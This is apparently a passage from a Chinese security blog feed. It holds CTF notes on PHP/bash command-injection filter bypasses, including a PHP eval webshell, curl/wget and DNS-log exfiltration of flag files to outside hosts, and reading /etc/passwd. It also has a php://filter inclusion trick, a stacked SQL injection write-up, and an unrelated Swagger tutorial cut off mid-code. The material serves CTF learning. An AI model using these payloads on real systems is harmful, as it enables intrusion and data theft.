class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 1) 利用正则匹配绕过</span><br><br>cat /???/pass*<br><br><span class="hljs-comment"># 2) 例如过滤/etc/passwd中的etc，利用未初始化变量，使用$u绕过</span><br>cat /etc<span class="hljs-variable">$u</span>/passwd<br><br><span class="hljs-comment"># 备注：此方法能绕CloudFlare WAF（出自：https://www.secjuice.com/php-rce-bypass-filte</span><br></code></pre></div></td></tr></table></figure><h4 id="1-1-7-命令执行函数system-绕过"><a href="#1-1-7-命令执行函数system-绕过" class="headerlink" title="1.1.7 命令执行函数system()绕过"></a>1.1.7 命令执行函数system()绕过</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="hljs-string">&quot;cat%20/flag&quot;</span>);<br><br>(sy.(st).em)(whoami);<br></code></pre></div></td></tr></table></figure><p>使用内敛执行</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> `ls`;<br><span class="hljs-keyword">echo</span> $(ls);<br><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`ls`;<br><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>$(ls);<br></code></pre></div></td></tr></table></figure><h4 id="1-1-8-使用-和-，-x-x"><a href="#1-1-8-使用-和-，-x-x" class="headerlink" title="1.1.8 使用$*和$@，$x,${x}"></a>1.1.8 使用$*和$@，$x,${x}</h4><p>注：因为在没有传参的情况下，上面的特殊变量都是为空的</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ca$*t ./flag<br>ca<span class="hljs-variable">$@t</span> ./flag<br>ca<span class="hljs-variable">$2t</span> ./flag<br>ca<span class="hljs-variable">$&#123;11&#125;</span>t ./flag<br></code></pre></div></td></tr></table></figure><h4 id="1-1-9-读取文件其他姿势"><a href="#1-1-9-读取文件其他姿势" class="headerlink" title="1.1.9 读取文件其他姿势"></a>1.1.9 读取文件其他姿势</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl file:///flag<br>strings /flag<br>uniq -c/etc/passwd<br>bash -v /etc/passwd<br>rev /etc/passwd<br>find -- 列出当前目录下的文件以及子目录所有文件<br></code></pre></div></td></tr></table></figure><h3 id="1-2-过滤空格"><a href="#1-2-过滤空格" class="headerlink" title="1.2 过滤空格"></a>1.2 过滤空格</h3><ol><li>%09</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;&gt;</li><li>&lt;</li><li>{cat,flag}</li></ol><h3 id="1-3-过滤"><a href="#1-3-过滤" class="headerlink" title="1.3 过滤/"></a>1.3 过滤<code>/</code></h3><p>多次利用管道命令即可</p><p>如下：</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">;<span class="hljs-built_in">cd</span> flag;cat flag.txt<br></code></pre></div></td></tr></table></figure><h3 id="1-4-过滤分隔符-amp"><a href="#1-4-过滤分隔符-amp" class="headerlink" title="1.4 过滤分隔符|,&amp;,;"></a>1.4 过滤分隔符<code>|</code>,<code>&amp;</code>,<code>;</code></h3><blockquote><p>;    //分号<br>|    //只执行后面那条命令<br>||    //只执行前面那条命令<br>&amp;    //两条命令都会执行<br>&amp;&amp;    //两条命令都会执行</p></blockquote><p>绕过方式</p><ul><li><p>%0a表示换行</p></li><li><p>%0d表示回车</p></li><li><p>?&gt;代替;</p><p>在php中可以用<code>?&gt;</code>来代替最后一个<code>;</code>因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号</p></li></ul><h3 id="1-5-字符串长度受限"><a href="#1-5-字符串长度受限" class="headerlink" title="1.5 字符串长度受限"></a>1.5 字符串长度受限</h3><p><a href="https://www.anquanke.com/post/id/87203">参考链接</a></p><h3 id="1-6-无回显"><a href="#1-6-无回显" class="headerlink" title="1.6 无回显"></a>1.6 无回显</h3><p>判断：ls;sleep(2)</p><ol><li><p>利用写入shell的方法进行获取</p> <figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"><span class="hljs-built_in">echo</span> &quot;&lt;?php @eval(\$_POST[<span class="hljs-number">123</span>]); ?&gt;&quot; &gt; webshell.php<br></code></pre></div></td></tr></table></figure></li><li><p>在VPS上建立记录脚本</p><p> 在自己的服务器上写对应文件</p> <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$data</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-variable">$f</span> = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>fwrite(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$data</span>);<br>fclose(<span class="hljs-variable">$f</span>);<br></code></pre></div></td></tr></table></figure><p> 之后利用目标机进行请求</p> <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl http://*.*.*.**/record.php?data=`cat flag.php|base64`<br><span class="hljs-comment"># 或</span><br>wget http://*.*.*.*/record.php?data=`cat flag.php|base64`<br></code></pre></div></td></tr></table></figure></li><li><p>利用http请求/dns请求方法带出</p> <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl `命令`.域名<br>curl `cat&lt;flag.php|base64`.v4utm7.ceye.io<br></code></pre></div></td></tr></table></figure></li><li><p>linux tee命令</p><p> Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p> <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tee file1 file2 //复制文件<br>ls /|tee 1.txt //命令输出<br></code></pre></div></td></tr></table></figure></li><li><p><a href="https://blog.csdn.net/qq_43625917/article/details/107873787">更多方法</a></p></li></ol><h3 id="1-7-gt-dev-null-2-gt-amp-1类无回显"><a href="#1-7-gt-dev-null-2-gt-amp-1类无回显" class="headerlink" title="1.7 &gt;/dev/null 2&gt;&amp;1类无回显"></a>1.7 &gt;/dev/null 2&gt;&amp;1类无回显</h3><p>利用命令分隔即可，即<code>|</code>等等</p><h3 id="1-8-Perl中的open命令执行-GET"><a href="#1-8-Perl中的open命令执行-GET" class="headerlink" title="1.8 Perl中的open命令执行(GET)"></a>1.8 Perl中的open命令执行(GET)</h3><p><a href="https://blog.csdn.net/qq_44657899/article/details/107720578">参考</a></p><h3 id="1-9-无数字字母getshell"><a href="#1-9-无数字字母getshell" class="headerlink" title="1.9 无数字字母getshell"></a>1.9 无数字字母getshell</h3><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">参考</a></p><h3 id="1-10-无参数RCE"><a href="#1-10-无参数RCE" class="headerlink" title="1.10 无参数RCE"></a>1.10 无参数RCE</h3><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">参考</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/qq_44657899/article/details/107676580">https://blog.csdn.net/qq_44657899/article/details/107676580</a></p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件隐藏常用</title>
    <link href="/2021/04/17/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F%E5%B8%B8%E7%94%A8/"/>
    <url>/2021/04/17/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F%E5%B8%B8%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-Include-1【文件包含】及-极客大挑战-2019-Secret-File-1"><a href="#ACTF2020-新生赛-Include-1【文件包含】及-极客大挑战-2019-Secret-File-1" class="headerlink" title="[ACTF2020 新生赛]Include 1【文件包含】及[极客大挑战 2019]Secret File 1"></a>[ACTF2020 新生赛]Include 1【文件包含】及[极客大挑战 2019]Secret File 1</h1><p>均使用如下代码进行文件的完整读取</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=***.php</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯 2019_随便注 1</title>
    <link href="/2021/04/12/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%201/"/>
    <url>/2021/04/12/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%201/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h1><h2 id="首先自己尝试注入"><a href="#首先自己尝试注入" class="headerlink" title="首先自己尝试注入"></a>首先自己尝试注入</h2><p>使用 1’ or 1=1%23没有查到有用的信息，</p><p>下一步查看回显</p><p>​    return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p><p>不能使用</p><p>使用堆叠注入</p><p>0’; show databases;%23</p><p>0’; show tables;%23</p><p>0’;desc <code>1919810931114514</code>;%23</p><p>注意此处使用的是**`**符号</p><p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003453638-1441438599.png" alt="他们是真的强"></p><p>通过查表结构可以知道在该表中</p><p>0’;desc words;%23</p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript"><span class="hljs-number">0</span>&#x27;;rename table <span class="hljs-built_in">words</span> <span class="hljs-keyword">to</span> words1;rename table `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> <span class="hljs-built_in">words</span>;alter table <span class="hljs-built_in">words</span> change flag <span class="hljs-built_in">id</span> varchar(<span class="hljs-number">100</span>) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  <span class="hljs-built_in">words</span>;<span class="hljs-comment">#</span><br></code></pre></div></td></tr></table></figure><p><strong>id=1’ or 1=1#</strong></p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_jvm规范</title>
    <link href="/2021/04/12/Java/JavaBase/java_base_jvm%E8%A7%84%E8%8C%83/"/>
    <url>/2021/04/12/Java/JavaBase/java_base_jvm%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="JVM-规范"><a href="#JVM-规范" class="headerlink" title="JVM 规范"></a>JVM 规范</h1><p><img src="https://uploadfiles.nowcoder.com/images/20190314/242025553_1552556718666_11CD8DF4C9693369E94F5F84238EBBC6" alt="其他人是真的强"></p>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>JVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>集成Swagger终极版</title>
    <link href="/2021/04/12/SpringBoot/%E9%9B%86%E6%88%90Swagger%E7%BB%88%E6%9E%81%E7%89%88%20/"/>
    <url>/2021/04/12/SpringBoot/%E9%9B%86%E6%88%90Swagger%E7%BB%88%E6%9E%81%E7%89%88%20/</url>
    
    <content type="html"><![CDATA[<h1 id="项目集成Swagger"><a href="#项目集成Swagger" class="headerlink" title="项目集成Swagger"></a>项目集成Swagger</h1><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZTC6jIsjNx49oFBGgaKyeYOEwIDAabKy11vOWkXYau0uYkH2RG5Rkvg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>学习目标：</strong></p><ul><li>了解Swagger的概念及作用</li><li>掌握在项目中集成Swagger自动生成API文档</li></ul><blockquote><h3 id="Swagger简介"><a href="#Swagger简介" class="headerlink" title="Swagger简介"></a>Swagger简介</h3></blockquote><p><strong>前后端分离</strong></p><ul><li>前端 -&gt; 前端控制层、视图层</li><li>后端 -&gt; 后端控制层、服务层、数据访问层</li><li>前后端通过API进行交互</li><li>前后端相对独立且松耦合</li></ul><p><strong>产生的问题</strong></p><ul><li>前后端集成，前端或者后端无法做到“及时协商，尽早解决”，最终导致问题集中爆发</li></ul><p><strong>解决方案</strong></p><ul><li>首先定义schema [ 计划的提纲 ]，并实时跟踪最新的API，降低集成风险</li></ul><p><strong>Swagger</strong></p><ul><li>号称世界上最流行的API框架</li><li>Restful Api 文档在线自动生成器 =&gt; <strong>API 文档 与API 定义同步更新</strong></li><li>直接运行，在线测试API</li><li>支持多种语言 （如：Java，PHP等）</li><li>官网：<a href="https://swagger.io/">https://swagger.io/</a></li></ul><blockquote><h3 id="SpringBoot集成Swagger"><a href="#SpringBoot集成Swagger" class="headerlink" title="SpringBoot集成Swagger"></a>SpringBoot集成Swagger</h3></blockquote><p><strong>SpringBoot集成Swagger</strong> =&gt; <strong>springfox</strong>，两个jar包</p><ul><li><strong>Springfox-swagger2</strong></li><li>swagger-springmvc</li></ul><p><strong>使用Swagger</strong></p><p>要求：jdk 1.8 + 否则swagger2无法运行</p><p>步骤：</p><p>1、新建一个SpringBoot-web项目</p><p>2、添加Maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>3、编写HelloController，测试确保运行成功！</p><p>4、要使用Swagger，我们需要编写一个配置类-SwaggerConfig来配置 Swagger</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span> <span class="hljs-comment">//配置类</span><br><span class="hljs-meta">@EnableSwagger2</span><span class="hljs-comment">// 开启Swagger2的自动配置</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SwaggerConfig</span> </span>&#123;  <br>&#125;<br></code></pre></div></td></tr></table></figure><p>5、访问测试 ：<a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a> ，可以看到swagger的界面；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZzSgcwYhS2RhtRXv0Wfg9OkiaE6xDEQibt8TSJTt9OHzFzeq9NrQCJNZQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><blockquote><h3 id="配置Swagger"><a href="#配置Swagger" class="headerlink" title="配置Swagger"></a>配置Swagger</h3></blockquote><p>1、Swagger实例Bean是Docket，所以通过配置Docket实例来配置Swaggger。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span> <span class="hljs-comment">//配置docket以配置Swagger具体参数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、可以通过apiInfo()属性配置文档信息</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//配置文档信息</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> ApiInfo <span class="hljs-title">apiInfo</span><span class="hljs-params">()</span> </span>&#123;<br>    Contact contact = <span class="hljs-keyword">new</span> Contact(<span class="hljs-string">&quot;联系人名字&quot;</span>, <span class="hljs-string">&quot;http://xxx.xxx.com/联系人访问链接&quot;</span>, <span class="hljs-string">&quot;联系人邮箱&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ApiInfo(<br>            <span class="hljs-string">&quot;Swagger学习&quot;</span>, <span class="hljs-comment">// 标题</span><br>            <span class="hljs-string">&quot;学习演示如何配置Swagger&quot;</span>, <span class="hljs-comment">// 描述</span><br>            <span class="hljs-string">&quot;v1.0&quot;</span>, <span class="hljs-comment">// 版本</span><br>            <span class="hljs-string">&quot;http://terms.service.url/组织链接&quot;</span>, <span class="hljs-comment">// 组织链接</span><br>            contact, <span class="hljs-comment">// 联系人信息</span><br>            <span class="hljs-string">&quot;Apach 2.0 许可&quot;</span>, <span class="hljs-comment">// 许可</span><br>            <span class="hljs-string">&quot;许可链接&quot;</span>, <span class="hljs-comment">// 许可连接</span><br>            <span class="hljs-keyword">new</span> ArrayList&lt;&gt;()<span class="hljs-comment">// 扩展</span><br>    );<br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、Docket 实例关联上 apiInfo()</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo());<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、重启项目，访问测试 <a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a>  看下效果；</p><blockquote><h3 id="配置扫描接口"><a href="#配置扫描接口" class="headerlink" title="配置扫描接口"></a>配置扫描接口</h3></blockquote><p>1、构建Docket时通过select()方法配置怎么扫描接口。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2)<br>        .apiInfo(apiInfo())<br>        .select()<span class="hljs-comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span><br>        .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.kuang.swagger.controller&quot;</span>))<br>        .build();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、重启项目测试，由于我们配置根据包的路径扫描接口，所以我们只能看到一个类</p><p>3、除了通过包路径配置扫描接口外，还可以通过配置其他方式扫描接口，这里注释一下所有的配置方式：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">any() <span class="hljs-comment">// 扫描所有，项目中的所有接口都会被扫描到</span><br>none() <span class="hljs-comment">// 不扫描接口</span><br><span class="hljs-comment">// 通过方法上的注解扫描，如withMethodAnnotation(GetMapping.class)只扫描get请求</span><br>withMethodAnnotation(<span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; annotation)<br><span class="hljs-comment">// 通过类上的注解扫描，如.withClassAnnotation(Controller.class)只扫描有controller注解的类中的接口</span><br>withClassAnnotation(<span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; annotation)<br>basePackage(<span class="hljs-keyword">final</span> String basePackage) <span class="hljs-comment">// 根据包路径扫描接口</span><br></code></pre></div></td></tr></table></figure><p>4、除此之外，我们还可以配置接口扫描过滤：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2)<br>        .apiInfo(apiInfo())<br>        .select()<span class="hljs-comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span><br>        .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.kuang.swagger.controller&quot;</span>))<br>        <span class="hljs-comment">// 配置如何通过path过滤,即这里只扫描请求以/kuang开头的接口</span><br>        .paths(PathSelectors.ant(<span class="hljs-string">&quot;/kuang/**&quot;</span>))<br>        .build();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>5、这里的可选值还有</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">any() <span class="hljs-comment">// 任何请求都扫描</span><br>none() <span class="hljs-comment">// 任何请求都不扫描</span><br>regex(<span class="hljs-keyword">final</span> String pathRegex) <span class="hljs-comment">// 通过正则表达式控制</span><br>ant(<span class="hljs-keyword">final</span> String antPattern) <span class="hljs-comment">// 通过ant()控制</span><br></code></pre></div></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9Zbja0VwsQkjaNVC5GWsge3SlQeg0jmxdjBMLOoOsqqD6gc6jshv4Qdw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><h3 id="配置Swagger开关"><a href="#配置Swagger开关" class="headerlink" title="配置Swagger开关"></a>配置Swagger开关</h3></blockquote><p>1、通过enable()方法配置是否启用swagger，如果是false，swagger将不能在浏览器中访问了</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2)<br>        .apiInfo(apiInfo())<br>        .enable(<span class="hljs-keyword">false</span>) <span class="hljs-comment">//配置是否启用Swagger，如果是false，在浏览器将无法访问</span><br>        .select()<span class="hljs-comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span><br>        .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.kuang.swagger.controller&quot;</span>))<br>        <span class="hljs-comment">// 配置如何通过path过滤,即这里只扫描请求以/kuang开头的接口</span><br>        .paths(PathSelectors.ant(<span class="hljs-string">&quot;/kuang/**&quot;</span>))<br>        .build();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、如何动态配置当项目处于test、dev环境时显示swagger，处于prod时不显示？</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">(Environment environment)</span> </span>&#123;<br>    <span class="hljs-comment">// 设置要显示swagger的环境</span><br>    Profiles of = Profiles.of(<span class="hljs-string">&quot;dev&quot;</span>, <span 